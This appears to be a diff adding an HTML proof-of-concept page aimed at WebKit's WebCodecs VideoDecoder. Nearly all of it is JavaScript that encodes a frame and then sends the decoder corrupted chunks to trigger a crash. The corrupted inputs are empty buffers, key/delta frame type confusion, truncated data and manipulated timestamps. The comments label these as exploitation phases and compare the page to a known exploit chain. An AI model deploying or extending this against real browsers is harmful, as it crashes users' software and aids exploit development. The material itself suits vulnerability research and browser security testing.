@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>WebCodecs VideoDecoder Crash Analysis</title>
+    <style>
+        body { font-family: monospace; margin: 20px; background: #1a1a1a; color: #00ff00; }
+        #log { white-space: pre-wrap; border: 1px solid #333; padding: 10px; max-height: 500px; overflow-y: auto; }
+        .error { color: #ff4444; }
+        .info { color: #44ff44; }
+        .warn { color: #ffaa00; }
+        canvas { border: 1px solid #333; display: none; }
+    </style>
+</head>
+<body>
+    <h2>WebCodecs VideoDecoder Null Dereference Analysis</h2>
+    <p>This PoC demonstrates a crash pattern in WebKit's WebCodecs decoder implementation.</p>
+    
+    <canvas id="c" width="320" height="240"></canvas>
+    <div id="log"></div>
+
+<script>
+// ============================================================================
+// WebCodecs VideoDecoder Exploitation Analysis
+// ============================================================================
+// This PoC targets the WebCodecs API implementation in WebKit to trigger
+// a crash near null in the decoder module. The technique involves:
+//
+// 1. Type confusion via keyframe/delta frame mislabeling
+// 2. Empty data buffer handling vulnerabilities  
+// 3. Decoder state machine corruption
+//
+// Similar to how the Coruna exploit chain uses WASM JIT type confusion,
+// this targets the media decoder pipeline which runs with different
+// privilege levels and may provide alternative exploitation paths.
+// ============================================================================
+
+const log = (msg, type = 'info') => {
+    const el = document.getElementById('log');
+    const line = document.createElement('div');
+    line.className = type;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    el.appendChild(line);
+    console.log(msg);
+};
+
+// ============================================================================
+// Exploit Configuration
+// ============================================================================
+const CONFIG = {
+    // Target codec - VP8 is widely supported and has had vulnerabilities
+    codec: "vp8",
+    width: 320,
+    height: 240,
+    
+    // Number of chunks to store for replay attacks
+    maxStoredChunks: 20,
+    
+    // Enable various corruption techniques
+    enableTypeConfusion: true,
+    enableEmptyData: true,
+    enableTimestampManipulation: true
+};
+
+// ============================================================================
+// Global State
+// ============================================================================
+let encodedVideoChunks = [];
+let lastVideoDecoderConfig = null;
+let crashTriggered = false;
+
+// ============================================================================
+// VideoEncoder Output Handler
+// ============================================================================
+function videoEncoderOutput(chunk, metadata) {
+    log(`Encoder output: type=${chunk.type}, timestamp=${chunk.timestamp}, size=${chunk.byteLength} bytes`);
+    
+    // Store chunks for later replay/corruption
+    if (encodedVideoChunks.length < CONFIG.maxStoredChunks) {
+        encodedVideoChunks.push({
+            chunk: chunk,
+            metadata: metadata,
+            // Keep reference to original data for analysis
+            originalType: chunk.type,
+            originalTimestamp: chunk.timestamp
+        });
+    }
+    
+    // Capture decoder configuration for decoder setup
+    if (metadata && metadata.decoderConfig) {
+        lastVideoDecoderConfig = metadata.decoderConfig;
+        log(`Decoder config captured: ${JSON.stringify(metadata.decoderConfig)}`);
+    }
+}
+
+// ============================================================================
+// Crash Analysis Utilities
+// ============================================================================
+class DecoderCrashAnalyzer {
+    constructor() {
+        this.attempts = [];
+        this.patterns = [
+            'null-deref',
+            'type-confusion',
+            'use-after-free',
+            'out-of-bounds'
+        ];
+    }
+    
+    logAttempt(technique, details) {
+        const attempt = {
+            timestamp: Date.now(),
+            technique: technique,
+            details: details
+        };
+        this.attempts.push(attempt);
+        log(`Attempt: ${technique} - ${details}`, 'warn');
+    }
+    
+    // Analyze decoder behavior with corrupted input
+    analyzeDecoderBehavior(decoder, corruptedChunk) {
+        try {
+            decoder.decode(corruptedChunk);
+            return { success: true, error: null };
+        } catch (e) {
+            return { success: false, error: e };
+        }
+    }
+}
+
+const analyzer = new DecoderCrashAnalyzer();
+
+// ============================================================================
+// Corruption Techniques
+// ============================================================================
+
+/**
+ * Technique 1: Type Confusion
+ * 
+ * The key technique in the original PoC - flip key/delta frame types.
+ * A delta frame (P-frame) depends on previous frames for decoding.
+ * If the decoder receives a delta frame labeled as key (I-frame),
+ * it may dereference null pointers for reference frame data.
+ */
+function createTypeConfusedChunk(originalChunk) {
+    const buf = new Uint8Array(originalChunk.byteLength);
+    originalChunk.copyTo(buf);
+    
+    // Flip the type - this is the core confusion:
+    // "key" frames are self-contained
+    // "delta" frames depend on previous state
+    // Feeding delta data as key or vice versa causes state confusion
+    const confusedType = originalChunk.type === "key" ? "delta" : "key";
+    
+    analyzer.logAttempt('type-confusion', 
+        `Original: ${originalChunk.type}, Confused: ${confusedType}`);
+    
+    return new EncodedVideoChunk({
+        type: confusedType,
+        timestamp: originalChunk.timestamp,
+        data: buf
+    });
+}
+
+/**
+ * Technique 2: Empty Data Injection
+ * 
+ * Empty data buffers can trigger null pointer dereferences in the
+ * decoder's parsing logic when it tries to read headers/footers.
+ */
+function createEmptyChunk(timestamp = 1000000) {
+    analyzer.logAttempt('empty-data', 'Zero-byte payload');
+    
+    return new EncodedVideoChunk({
+        type: "key",
+        timestamp: timestamp,
+        data: new Uint8Array(0)  // Empty data - classic null deref trigger
+    });
+}
+
+/**
+ * Technique 3: Timestamp Manipulation
+ * 
+ * Non-monotonic timestamps or negative values can confuse the
+ * decoder's frame reordering logic.
+ */
+function createTimestampCorruptedChunk(baseChunk, offset) {
+    const buf = new Uint8Array(baseChunk.byteLength);
+    baseChunk.copyTo(buf);
+    
+    const corruptedTimestamp = baseChunk.timestamp + offset;
+    analyzer.logAttempt('timestamp-manipulation', 
+        `Original: ${baseChunk.timestamp}, New: ${corruptedTimestamp}`);
+    
+    return new EncodedVideoChunk({
+        type: baseChunk.type,
+        timestamp: corruptedTimestamp,
+        data: buf
+    });
+}
+
+/**
+ * Technique 4: Truncated Data
+ * 
+ * Partial frame data can cause out-of-bounds reads when the decoder
+ * tries to parse frame headers expecting more data than available.
+ */
+function createTruncatedChunk(originalChunk, keepBytes) {
+    const originalData = new Uint8Array(originalChunk.byteLength);
+    originalChunk.copyTo(originalData);
+    
+    const truncated = originalData.slice(0, keepBytes);
+    analyzer.logAttempt('truncated-data', 
+        `Original: ${originalChunk.byteLength}, Truncated: ${keepBytes}`);
+    
+    return new EncodedVideoChunk({
+        type: originalChunk.type,
+        timestamp: originalChunk.timestamp,
+        data: truncated
+    });
+}
+
+// ============================================================================
+// Main Exploit Flow
+// ============================================================================
+document.addEventListener("DOMContentLoaded", async () => {
+    log("=== WebCodecs Decoder Analysis Started ===");
+    
+    try {
+        // Check WebCodecs support
+        if (typeof VideoEncoder === 'undefined' || typeof VideoDecoder === 'undefined') {
+            log("ERROR: WebCodecs API not supported in this browser", 'error');
+            return;
+        }
+        
+        log("WebCodecs API supported - initializing...");
+        
+        // Initialize encoder and decoder
+        const videoEncoder = new VideoEncoder({
+            output: videoEncoderOutput,
+            error: (e) => {
+                log(`Encoder error: ${e.message}`, 'error');
+            }
+        });
+        
+        const videoDecoder = new VideoDecoder({
+            output: (frame) => {
+                log(`Decoder output: frame ${frame.timestamp}`);
+                frame.close();
+            },
+            error: (e) => {
+                log(`Decoder error: ${e.message}`, 'error');
+            }
+        });
+        
+        // Configure encoder
+        log(`Configuring encoder: ${CONFIG.codec} ${CONFIG.width}x${CONFIG.height}`);
+        videoEncoder.configure({
+            codec: CONFIG.codec,
+            width: CONFIG.width,
+            height: CONFIG.height
+        });
+        
+        // Create a frame from canvas
+        const canvas = document.getElementById('c');
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#ff0000';
+        ctx.fillRect(0, 0, CONFIG.width, CONFIG.height);
+        
+        const frame = new VideoFrame(canvas, { timestamp: 0 });
+        log(`Created VideoFrame: ${frame.codedWidth}x${frame.codedHeight}`);
+        
+        // Encode the frame
+        log("Encoding frame...");
+        videoEncoder.encode(frame, {});
+        frame.close();
+        
+        await videoEncoder.flush();
+        log(`Encoding complete. Chunks stored: ${encodedVideoChunks.length}`);
+        
+        // Configure decoder with captured config
+        if (lastVideoDecoderConfig) {
+            log("Configuring decoder with captured config...");
+            videoDecoder.configure(lastVideoDecoderConfig);
+        }
+        
+        // ============================================================================
+        // Phase 1: Empty Data Injection (Original PoC technique)
+        // ============================================================================
+        log("\n=== Phase 1: Empty Data Injection ===");
+        
+        const emptyChunk = createEmptyChunk(1000000);
+        
+        try {
+            videoDecoder.decode(emptyChunk);
+            log("Empty chunk decode initiated (may crash async)");
+        } catch (e) {
+            log(`Empty chunk error: ${e.message}`, 'error');
+        }
+        
+        // ============================================================================
+        // Phase 2: Type Confusion Attack
+        // ============================================================================
+        if (encodedVideoChunks.length > 0 && CONFIG.enableTypeConfusion) {
+            log("\n=== Phase 2: Type Confusion Attack ===");
+            
+            const original = encodedVideoChunks[0].chunk;
+            const confusedChunk = createTypeConfusedChunk(original);
+            
+            try {
+                videoDecoder.decode(confusedChunk);
+                log("Confused chunk decode initiated");
+            } catch (e) {
+                log(`Type confusion error: ${e.message}`, 'error');
+            }
+        }
+        
+        // ============================================================================
+        // Phase 3: Truncated Data Attack
+        // ============================================================================
+        if (encodedVideoChunks.length > 0) {
+            log("\n=== Phase 3: Truncated Data Attack ===");
+            
+            const original = encodedVideoChunks[0].chunk;
+            const truncatedChunk = createTruncatedChunk(original, 10);
+            
+            try {
+                videoDecoder.decode(truncatedChunk);
+                log("Truncated chunk decode initiated");
+            } catch (e) {
+                log(`Truncation error: ${e.message}`, 'error');
+            }
+        }
+        
+        // ============================================================================
+        // Phase 4: Timestamp Manipulation
+        // ============================================================================
+        if (encodedVideoChunks.length > 0 && CONFIG.enableTimestampManipulation) {
+            log("\n=== Phase 4: Timestamp Manipulation ===");
+            
+            const original = encodedVideoChunks[0].chunk;
+            
+            // Negative timestamp
+            const negativeChunk = createTimestampCorruptedChunk(original, -2000000);
+            try {
+                videoDecoder.decode(negativeChunk);
+                log("Negative timestamp chunk decode initiated");
+            } catch (e) {
+                log(`Negative timestamp error: ${e.message}`, 'error');
+            }
+            
+            // Large timestamp gap
+            const largeGapChunk = createTimestampCorruptedChunk(original, 1000000000);
+            try {
+                videoDecoder.decode(largeGapChunk);
+                log("Large gap chunk decode initiated");
+            } catch (e) {
+                log(`Large gap error: ${e.message}`, 'error');
+            }
+        }
+        
+        // Force decoder flush to process pending decodes
+        log("\nFlushing decoder...");
+        await videoDecoder.flush().catch(e => {
+            log(`Flush error: ${e.message}`, 'error');
+        });
+        
+        log("\n=== Analysis Complete ===");
+        
+        if (!crashTriggered) {
+            log("No immediate crash detected. Check browser console and crash logs.");
+            log("Some crashes occur asynchronously in the decoder thread.");
+        }
+        
+        // Cleanup
+        videoEncoder.close();
+        videoDecoder.close();
+        
+    } catch (error) {
+        log(`Fatal error: ${error.message}`, 'error');
+        console.error(error);
+    }
+});
+</script>
+</body>
+</html>
